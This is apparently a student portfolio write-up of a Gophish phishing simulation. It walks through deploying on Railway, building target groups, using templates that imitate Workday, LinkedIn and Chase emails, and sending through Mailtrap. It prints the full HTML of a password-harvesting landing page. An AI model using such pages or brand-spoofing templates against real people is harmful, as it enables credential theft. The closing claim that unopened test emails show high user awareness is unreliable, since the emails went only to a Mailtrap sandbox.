Phishing Attack Simulation
<br>
I'm using **Gophish**, an open-source phishing framework designed for testing an organization's resilience to phishing attacks. It’s a flexible tool that allows you to create custom phishing templates with a full HTML editor, launch email campaigns, and track responses in near real-time.
<br>
<br>
The reason I chose Gophish is because of its simplicity and robust feature set. It’s written in Go and offers binaries for multiple platforms like Windows, Mac, and Linux, making it easy to deploy. You can even set it up using cloud services like DigitalOcean, though for this project, I’m deploying it through Railway for integration.
<br>
<br>
Railway is a modern app hosting platform that makes it easy to deploy production-ready apps quickly. Railway offers GitHub repository as the deployment source.
<br>
<img src="https://github.com/user-attachments/assets/91956ef0-1641-40d7-a631-7bd705adfba4" width="480" height="350">

<br>
# Creating deployment to gophish by forking gophish via Github
<img src="https://github.com/user-attachments/assets/bc20e52a-7e57-45bb-8712-3883f067b53d" width="480" height="450">
<br>
<br>

# Creating new variable for deployment for port 3333

```
attractive-curiosity-gophish-playground.up.railway.app
```

<img src="https://github.com/user-attachments/assets/cc6edc89-e064-4286-aa5b-dc31f603fcb6" width="400" height="150">
<br>
<img src="https://github.com/user-attachments/assets/728fc7e7-d2b1-47c4-8240-20b5dc3daf36" width="750" height="280">
<br>
<br>

# Deployed Variable

<img src="https://github.com/user-attachments/assets/3447f010-b044-4e9b-8190-244b6cb2c37d" width="800" height="350">
<br>
<img src="https://github.com/user-attachments/assets/5ec36365-6bf5-4e16-87c0-8fd1ffc0944c" width="800" height="300">
<br>
<br>
Deployment Successful to procure gophish!
<br>
Obtained credentials through deployment logs
<br>
<img src="https://github.com/user-attachments/assets/f3f5b7f7-09e6-4ac8-a978-032d87f455de" width="650" height="100">

# Configuring file
Need to update config.json file, the highlighted values
<img src="https://github.com/user-attachments/assets/5ba5fced-71e1-451b-9a21-5e67f06e8fca" width="500" height="350">
<br>
<img src="https://github.com/user-attachments/assets/e136f149-80e5-4f1a-83f2-3e8eba1100ce" width="500" height="350">
<br>
<br>
Commiting changes triggers deployment on Railway
<br>
<img src="https://github.com/user-attachments/assets/24a3ce91-ea34-4ac8-a587-5dcccfd28667" width="650" height="280">


# Sucessfully completed Deployment
<br>
<img src="https://github.com/user-attachments/assets/5cc15b7d-6b40-40bb-95a3-a97c36d9996d" width="700" height="250">
<br>

# gophish setup

(Scrubbed sensitive data)
```
Logs- of password being updated 

time="2024-09-22T18:14:23Z" level=info msg="Please login with the username [REDACTED] and the password [REDACTED]"

time="2024-09-22T18:14:23Z" level=info msg="Starting IMAP monitor manager"

time="2024-09-22T18:14:23Z" level=info msg="Starting phishing server at [http://0.0.0.0:80](http://0.0.0.0/)";

time="2024-09-22T18:14:23Z" level=info msg="Background Worker Started Successfully - Waiting for Campaigns"

time="2024-09-22T18:14:23Z" level=info msg="Starting admin server at [http://0.0.0.0:3333](http://0.0.0.0:3333/)";

time="2024-09-22T18:14:23Z" level=info msg="Starting new IMAP monitor for user [REDACTED]"

time="2024-09-22T18:14:47Z" level=info msg="[REDACTED IP] - - [22/Sep/2024:18:14:47 +0000] \"GET / HTTP/1.1\" 307 51 \"\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\""

time="2024-09-22T18:14:47Z" level=info msg="[REDACTED IP] - - [22/Sep/2024:18:14:47 +0000] \"GET /login?next=%2F HTTP/1.1\" 200 1039 \"\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\""

time="2024-09-22T18:14:48Z" level=info msg="[REDACTED IP] - - [22/Sep/2024:18:14:47 +0000] \"GET /css/dist/gophish.css HTTP/1.1\" 200 52514 \"[https://attractive-curiosity-gophish-playground.up.railway.app/login?next=%2F\\](https://attractive-curiosity-gophish-playground.up.railway.app/login?next=%2F%5C%5C)" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36\""
```
<img src="https://github.com/user-attachments/assets/d7e6a36d-bc2c-46af-9d25-d463809d8991" width="600" height="250">
<br>
Logged in with obtained credentials from deployment above
<br>
<img src="https://github.com/user-attachments/assets/51bb38dc-f8a8-4d23-b5aa-39fc6f934895" width="800" height="250">
<br>
<br>


**Tasks performed for phishing simulation project using Gophish:**

- Configured **user groups** for targeted phishing email simulations, ensuring diverse role-based testing across departments.
- Created **phishing email templates**, including attachments such as PDFs and documents, to mimic real-world phishing attacks and test user responses.
- Set up **sending profiles**, specifying SMTP relay details for seamless email delivery across the simulated phishing campaigns.
- Designed custom **landing pages** that users are redirected to upon clicking phishing links, enabling accurate tracking of responses and user interaction.

<br>
Created a CSV file on Excel with a complication of a Cybersecurity Consulting Team from Secure Defense Group (group I created). With emails and relevant positions to each staff member.
<br>
<br>
In this project, I developed a series of phishing email templates to demonstrate the techniques used in social engineering attacks. The templates include:

1. **Account Verification Email**: Designed to mimic a notification from Workday, this email prompts users to verify their accounts.
2. **Password Change Notification**: This template alerts users to change their passwords for enhanced security.
3. **Survey Invitation**: Aimed at encouraging user interaction, this email leads recipients to a survey link.


# Created phishing email templates

# Realistic LinkedIn Survey with reward incentives to complete-
HTML pulled from an old survey email I received, to make it appear more realistic to bait employees into clicking. Honeypot theory with a reward. Attempting survey would send users to a landing page that they got phished.
<br>
<img src="https://github.com/user-attachments/assets/8f0af17f-422e-4128-a593-4d7c856d308e" width="350" height="390">


# Custom Warning email to update Chase bank account password, with HTML I created-
<img src="https://github.com/user-attachments/assets/5b6912c4-bc9c-4a90-bab7-0aec6d162d58" width="399" height="300">
<br>
<img src="https://github.com/user-attachments/assets/a7f1901b-b8ad-4d2a-96e0-ee194d736b02" width="399" height="490">



# Account Verification template
Created a simple account verification request email using HTML I created-
<br>
<img src="https://github.com/user-attachments/assets/a5daf060-d680-46a3-9fc3-b4223ad16e8c" width="399" height="350">
<br>
<img src="https://github.com/user-attachments/assets/a143f39f-464b-4250-89a7-0cc056914122" width="399" height="520">


# Creating Sending Profiles

**Mailtrap for Transactional Email API Service For Developers**
<br>
<img src="https://github.com/user-attachments/assets/8110ae7b-54e8-46cc-b8fe-33be683ee596" width="600" height="450">
<br>
- **Testing and Security**: I utilized Mailtrap to conduct safe testing of my phishing simulations, ensuring that no real emails were sent to unsuspecting recipients. This approach reflects my commitment to ethical cybersecurity practices.

- **Technical Skills Demonstration**: By setting up a simulated email environment, I showcased my ability to create controlled and secure settings for effective testing.

- **Purpose**: I used Mailtrap to verify that the emails were correctly formatted and functioned as intended, ensuring readiness for any potential real-world deployment.

# Sending test email
<img src="https://github.com/user-attachments/assets/aa44e75f-26f3-4b99-aa29-c0fdad578d1d" width="399" height="520">
<br>
<img src="https://github.com/user-attachments/assets/fcf0b502-335d-4ce8-b3e7-56efdff65a14" width="750" height="280">

<img src="https://github.com/user-attachments/assets/544a2875-ba6d-42fc-bb89-3440a7ffe1ad" width="399" height="300">

# Creating Landing Page with HTML
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Your Password</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #f4f4f4;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}
.container {
background: white;
padding: 20px;
border-radius: 8px;
box-shadow: 0 0 10px rgba(0,0,0,0.1);
width: 300px;
}
h2 {
text-align: center;
}
input[type="password"], input[type="submit"] {
width: calc(100% - 20px);
padding: 10px;
margin: 10px 0;
border: 1px solid #ddd;
border-radius: 5px;
}
input[type="submit"] {
background-color: #4CAF50;
color: white;
border: none;
cursor: pointer;
}
input[type="submit"]:hover {
background-color: #45a049;
}
</style>
</head>
<body>
<div class="container">
<h2>Update Your Password</h2>
<form action="https://your-server-url.com/submit" method="POST">
<label for="current-password">Current Password</label>
<input type="password" id="current-password" name="current-password" required>


        <label for="new-password">New Password</label>
        <input type="password" id="new-password" name="new-password" required>

        <label for="confirm-password">Confirm Password</label>
        <input type="password" id="confirm-password" name="confirm-password" required>

        <input type="submit" value="Submit">
    </form>
</div>



</body>
</html>

```
<img src="https://github.com/user-attachments/assets/ab07f615-81e0-464b-90f3-f6e5591e9aef" width="399" height="520">
<br>
Setting up campaign to batch send phishing emails out to Cybersecurity group
<img src="https://github.com/user-attachments/assets/b67373b9-933d-400f-8729-033a7a9039a3" width="620" height="280">

# Results
<br>
<img src="https://github.com/user-attachments/assets/cc4ebad4-ad4f-4f7c-acb5-bc881cff38cc" width="600" height="350">


# Project Wrap-Up 

In this phishing simulation project, we successfully created and deployed several phishing emails designed to test the awareness and responsiveness of users to potential threats. The campaign included various templates, including password update requests, account verifications, and survey invitations.

**Results:**

- **Email Delivery**: All emails were sent successfully to the targeted recipients.
- **Engagement Metrics**: Notably, none of the recipients opened the phishing emails. This outcome is promising, indicating a high level of awareness among users regarding potential phishing attempts.

If this simulation had been executed in a real-world environment, we would have expected to see results across several key metrics:

- **Emails Opened**: A measure of how many users recognized and engaged with the phishing attempt.
- **Links Clicked**: This would indicate whether users were lured into interacting with the malicious content.
- **Data Submitted**: Capturing any data entered by users on the phishing landing page would reveal susceptibility to such attacks.
- **Emails Reported**: Tracking how many users reported the phishing attempt would provide insights into the effectiveness of training and awareness programs.

### Conclusion

The results of this simulation suggest that user education and awareness training are effective in preventing phishing attacks. However, ongoing education and testing are crucial in maintaining vigilance against evolving threats. This project has provided valuable insights into user behavior and the effectiveness of our phishing awareness strategies!
